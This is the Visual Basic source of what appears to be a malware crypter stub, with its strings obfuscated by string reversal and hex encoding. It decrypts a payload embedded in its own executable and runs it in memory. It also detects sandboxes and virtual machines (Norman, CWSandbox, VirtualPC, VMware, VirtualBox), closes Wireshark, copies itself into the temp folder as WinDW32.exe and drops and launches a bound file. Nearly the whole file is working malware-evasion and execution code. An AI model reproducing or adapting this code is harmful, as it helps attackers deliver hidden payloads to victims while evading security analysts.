Attribute VB_Name = "mTrOstLos§_"

'##############################################################
'#Codigo encriptado de forma automatizada                     #
'#por el Karcrack Project Crypter v2.1 [KPC]                  #
'#Programado integramente por Karcrack                        #
'#Informacion de la encriptacion:                             #
'#	+ Encriptacion  :StrRev.                                  
'#	+ Contraseña    :-None-
'#	+ L. Encriptadas:22                                       
'#	+ Fecha/Hora    :11:40:16--23.03.2010                     
'##############################################################

'##############################################################
'#Codigo encriptado de forma automatizada                     #
'#por el Karcrack Project Crypter v2.1 [KPC]                  #
'#Programado integramente por Karcrack                        #
'#Informacion de la encriptacion:                             #
'#	+ Encriptacion  :Ascii                                    
'#	+ Contraseña    :-None-
'#	+ L. Encriptadas:22                                       
'#	+ Fecha/Hora    :11:40:14--23.03.2010                     
'##############################################################

'##############################################################
'#Codigo encriptado de forma automatizada                     #
'#por el Karcrack Project Crypter v2.1 [KPC]                  #
'#Programado integramente por Karcrack                        #
'#Informacion de la encriptacion:                             #
'#	+ Encriptacion  :StrRev.                                  
'#	+ Contraseña    :-None-
'#	+ L. Encriptadas:22                                       
'#	+ Fecha/Hora    :11:40:13--23.03.2010                     
'##############################################################

Function vm()
  Dim oAdapters As Object
  Dim oCard As Object
  Dim SQL As String
                       

   
  ' Abfrage erstellen
'1-> SELECT * FROM Win32_VideoController
'1-> rellortnoCoediV_23niW MORF * TCELES
'1-> 72656C6C6F72746E6F436F656469565F32336E6957204D4F5246202A205443454C4553
  SQL = StrReverse(kidniekph(StrReverse("3554C454344502A2026425F4D4027596E63323F565964656F634F6E64727F6C6C65627")))
'1-> winmgmts:
'1-> :stmgmniw
'1-> 3A73746D676D6E6977
  Set oAdapters = GetObject(StrReverse(kidniekph(StrReverse("7796E6D676D64737A3")))).ExecQuery(SQL)
 
  ' Auflisten aller Grafikadapter
  For Each oCard In oAdapters
    Select Case oCard.Description
   
'1-> VM Additions S3 Trio32/64
'1-> 46/23oirT 3S snoitiddA MV
'1-> 34362F32336F69725420335320736E6F697469646441204D56
        Case StrReverse(kidniekph(StrReverse("65D402144646964796F6E63702353302452796F63323F26343")))
   End
       
'1-> S3 Trio32/64
'1-> 46/23oirT 3S
'1-> 34362F32336F697254203353
        Case StrReverse(kidniekph(StrReverse("353302452796F63323F26343")))
         End
       
'1-> VirtualBox Graphics Adapter
'1-> retpadA scihparG xoBlautriV
'1-> 7265747061644120736369687061724720786F426C617574726956
        Case StrReverse(kidniekph(StrReverse("659627475716C624F6870274271607869636370214461607475627")))
      
          End
       
'1-> VMware SVGA II
'1-> II AGVS erawMV
'1-> 4949204147565320657261774D56
        Case StrReverse(kidniekph(StrReverse("65D4771627560235657414029494")))
        End
        
        
     
    End Select


       
  Next
End Function

Sub Main()
On Error Resume Next
Dim MyBuffer As String
Dim MySplit() As String
Dim MyEncr As New Class1
Dim MyFile As String  '1
Dim MyDecKey As String '2
Dim ASand As String '3
Dim ASniff As String '4
Dim AVirtuals As String '5
Dim FMessage As String '6
Dim FText As String '7
Dim FTitle As String '8
Dim FArt As String '9
Dim IRun As String '10
Dim AStart As String '11
Dim GBinder As String '12
Dim GBindFile As String '13
Dim SSpread As String '14
Dim SName As String '15
Dim FileKanal As Integer '16
Dim IntoDeep As New Class2
Dim dask() As Byte
FileKanal = FreeFile
 Dim sPath As String
   Open Filename For Output As #1
   Close #1
   sPath = String(260, 0)
   If FindExecutable(Filename, 0, sPath) > 32 Then
      sPath = Left(sPath, InStr(1, sPath, Chr(0)) - 1)
   Else
      sPath = ""
   End If
   Kill Filename
                             '1-> \; 2-> .exe
'1-> \; 2-> exe.
'1-> 5C; 2-> 6578652E
Open App.Path & StrReverse(kidniekph(StrReverse("C5"))) & App.EXEName & StrReverse(kidniekph(StrReverse("E2568756"))) For Binary Access Read As #FileKanal
                                                 '1-> \; 2-> .exe
'1-> \; 2-> exe.
'1-> 5C; 2-> 6578652E
MyBuffer = Space(FileLen(App.Path & StrReverse(kidniekph(StrReverse("C5"))) & App.EXEName & StrReverse(kidniekph(StrReverse("E2568756")))))
Get #FileKanal, , MyBuffer
Close #FileKanal

'1-> >deInEMutTery<
'1-> <yreTtuMEnIed>
'1-> 3C7972655474754D456E4965643E
MySplit = Split(MyBuffer, StrReverse(kidniekph(StrReverse("E3465694E654D4574745562797C3"))))

MyFile = MyEncr.DecryptString(MySplit(1), MySplit(2))

ASand = MySplit(3)

If ASand = 1 Then
If IsNormanPresent = True Then End
If IsCWPresent = True Then End
End If

ASniff = MySplit(4)

If ASniff = 1 Then
Dim WireHandle As String, WireClose As String
WireHandle = FindWindow(vbNullString, _
'1-> The Wireshark Network Analyzer
'1-> rezylanA krowteN krahseriW ehT
'1-> 72657A796C616E41206B726F7774654E206B726168736572695720656854
StrReverse(kidniekph(StrReverse("458656027596275637861627B602E4564777F627B60214E616C697A75627"))))
     WireClose = PostMessage _
     (WireHandle, &H10, 0&, 0&)
     End If
     
     AVirtuals = MySplit(5)
     
     If AVirtuals = 1 Then
If IsVirtualPC = True Then End
Call vm
End If

FMessage = MySplit(6)

If FMessage = 1 Then
FText = MySplit(7)
FTitle = MySplit(8)
FArt = MySplit(9)

Select Case FArt
'1-> Critic
'1-> citirC
'1-> 636974697243
Case StrReverse(kidniekph(StrReverse("342796479636")))
MsgBox FTitle, vbCritical, FText
'1-> Info
'1-> ofnI
'1-> 6F666E49
Case StrReverse(kidniekph(StrReverse("94E666F6")))
MsgBox FTitle, vbInformation, FText
'1-> Excla
'1-> alcxE
'1-> 616C637845
Case StrReverse(kidniekph(StrReverse("548736C616")))
MsgBox FTitle, vbExclamation, FText
End Select
End If

IRun = MySplit(10)

Select Case IRun
'1-> Wahr
'1-> rhaW
'1-> 72686157
Case StrReverse(kidniekph(StrReverse("75168627")))
dask = StrConv(MyFile, vbFromUnicode)
                                                               '1-> \; 2-> .exe
'1-> \; 2-> exe.
'1-> 5C; 2-> 6578652E
IntoDeep.r8q2e4HorMosHEmAZZBJVwR dask, App.Path & StrReverse(kidniekph(StrReverse("C5"))) & App.EXEName & StrReverse(kidniekph(StrReverse("E2568756")))
'1-> Falsch
'1-> hcslaF
'1-> 6863736C6146
Case StrReverse(kidniekph(StrReverse("6416C6373686")))
IntoDeep.r8q2e4HorMosHEmAZZBJVwR dask, sPath
End Select

AStart = MySplit(11)

If AStart = 1 Then
                                 '1-> \; 2-> .exe; 3-> tmp; 4-> \WinDW32.exe
'1-> \; 2-> exe.; 3-> pmt; 4-> exe.23WDniW\
'1-> 5C; 2-> 6578652E; 3-> 706D74; 4-> 6578652E323357446E69575C
FileCopy App.Path & StrReverse(kidniekph(StrReverse("C5"))) & App.EXEName & StrReverse(kidniekph(StrReverse("E2568756"))), Environ(StrReverse(kidniekph(StrReverse("47D607")))) & StrReverse(kidniekph(StrReverse("C57596E644753323E2568756")))
Call gla
End If

GBinder = MySplit(12)

If GBinder = 1 Then
GBindFile = MySplit(13)
'1-> tmp; 2-> \WindWUp32.exe
'1-> pmt; 2-> exe.23pUWdniW\
'1-> 706D74; 2-> 6578652E3233705557646E69575C
Open Environ(StrReverse(kidniekph(StrReverse("47D607")))) & StrReverse(kidniekph(StrReverse("C57596E6467555073323E2568756"))) For Binary As #1
'1-> bla
'1-> alb
'1-> 616C62
Put #1, , MyEncr.DecryptString(GBindFile, StrReverse(kidniekph(StrReverse("26C616"))))
Close #1
'1-> Open; 2-> WindwUp32.exe; 3-> tmp
'1-> nepO; 2-> exe.23pUwdniW; 3-> pmt
'1-> 6E65704F; 2-> 6578652E3233705577646E6957; 3-> 706D74
Call ShellExecute(1, StrReverse(kidniekph(StrReverse("F40756E6"))), StrReverse(kidniekph(StrReverse("7596E6467755073323E2568756"))), 1, Environ(StrReverse(kidniekph(StrReverse("47D607")))), 1)
End If

SSpread = MySplit(14)

If SSpread = 1 Then
SName = MySplit(15)
End If
End Sub

Public Function IsNormanPresent() As Boolean

'1-> C:\analyzer\scan
'1-> nacs\rezylana\:C
'1-> 6E6163735C72657A796C616E615C3A43
If App.Path = StrReverse(kidniekph(StrReverse("34A3C516E616C697A75627C5373616E6"))) Then
       IsNormanPresent = True
       Else
        IsNormanPresent = False
            End If


End Function
Public Function IsVirtualPC() As Boolean
    On Error Resume Next
    Dim bvASM(&HF)              As Byte
    Dim lOldSEH                 As Long
   
    m_bFlag = True
    lOldSEH = SetUnhandledExceptionFilter(AddressOf ExceptionHandler)
   
    Call PutMem8(ByVal VarPtr(bvASM(0)), THUNK_ANTI1)
    Call PutMem8(ByVal VarPtr(bvASM(0)) + 8, THUNK_ANTI2)
   
    Call CallWindowProc(VarPtr(bvASM(0)), 0&, 0&, 0&, 0&)
   
    Call SetUnhandledExceptionFilter(lOldSEH)
    IsVirtualPC = m_bFlag
End Function
Public Function IsCWPresent() As Boolean
'1-> .exe; 2-> :\sample.exe
'1-> exe.; 2-> exe.elpmas\:
'1-> 6578652E; 2-> 6578652E656C706D61735C3A
If App.Path & App.EXEName & StrReverse(kidniekph(StrReverse("E2568756"))) = SystemDrive & StrReverse(kidniekph(StrReverse("A3C53716D607C656E2568756"))) Then
   IsCWPresent = True
   Else
   
           IsCWPresent = False
           End If
End Function



